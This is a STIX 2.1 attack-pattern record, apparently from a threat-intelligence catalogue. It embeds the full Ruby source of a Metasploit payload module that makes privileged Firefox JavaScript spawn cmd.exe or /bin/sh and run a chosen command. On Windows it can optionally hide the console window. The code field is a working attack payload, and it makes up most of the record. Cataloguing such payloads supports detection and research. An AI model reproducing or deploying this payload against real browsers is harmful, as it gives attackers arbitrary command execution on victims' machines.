{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--84e0d1c3-9eb1-48c0-b9f7-4a5f45582a63",
    "created": "2024-08-14T16:33:19.392379Z",
    "modified": "2024-08-14T16:33:19.392383Z",
    "name": "Firefox XPCOM Execute Command",
    "description": "Q| This module runs a shell command on the target OS without touching the disk. On Windows, this command will flash the command prompt momentarily. This can be avoided by setting WSCRIPT to true, which drops a jscript \"launcher\" to disk that hides the prompt. |",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/firefox/exec.rb",
            "external_id": "exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nmodule MetasploitModule\n\n  CachedSize = 1019\n\n  include Msf::Payload::Single\n  include Msf::Payload::Firefox\n\n  def initialize(info={})\n    super(merge_info(info,\n      'Name'          => 'Firefox XPCOM Execute Command',\n      'Description'   => %Q|\n        This module runs a shell command on the target OS without touching the disk.\n        On Windows, this command will flash the command prompt momentarily.\n        This can be avoided by setting WSCRIPT to true, which drops a jscript\n        \"launcher\" to disk that hides the prompt.\n      |,\n      'Author'        => ['joev'],\n      'License'       => BSD_LICENSE,\n      'Platform'      => 'firefox',\n      'Arch'          => ARCH_FIREFOX\n    ))\n    register_options([\n      OptString.new('CMD', [true, \"The command string to execute\", 'touch /tmp/a.txt']),\n      OptBool.new('WSCRIPT', [true, \"On Windows, drop a vbscript to hide the cmd prompt\", false])\n    ])\n  end\n\n  def generate(_opts = {})\n    <<-EOS\n\n      (function(){\n        window = this;\n        #{read_file_source if datastore['WSCRIPT']}\n        #{run_cmd_source if datastore['WSCRIPT']}\n\n        var ua = Components.classes[\"@mozilla.org/network/protocol;1?name=http\"]\n        .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;\n        var windows = (ua.indexOf(\"Windows\")>-1);\n\n        var cmd = (#{JSON.unparse({ :cmd => datastore['CMD'] })}).cmd;\n        if (#{datastore['WSCRIPT']} && windows) {\n          runCmd(cmd);\n        } else {\n          var process = Components.classes[\"@mozilla.org/process/util;1\"]\n                          .createInstance(Components.interfaces.nsIProcess);\n          var sh = Components.classes[\"@mozilla.org/file/local;1\"]\n                    .createInstance(Components.interfaces.nsILocalFile);\n          var args;\n          if (windows) {\n            sh.initWithPath(\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe\");\n            args = [\"/c\", cmd];\n          } else {\n            sh.initWithPath(\"/bin/sh\");\n            args = [\"-c\", cmd];\n          }\n          process.init(sh);\n          process.run(true, args, args.length);\n        }\n      })();\n\n    EOS\n  end\nend\n",
    "x_mitre_platforms": [
        "firefox'"
    ]
}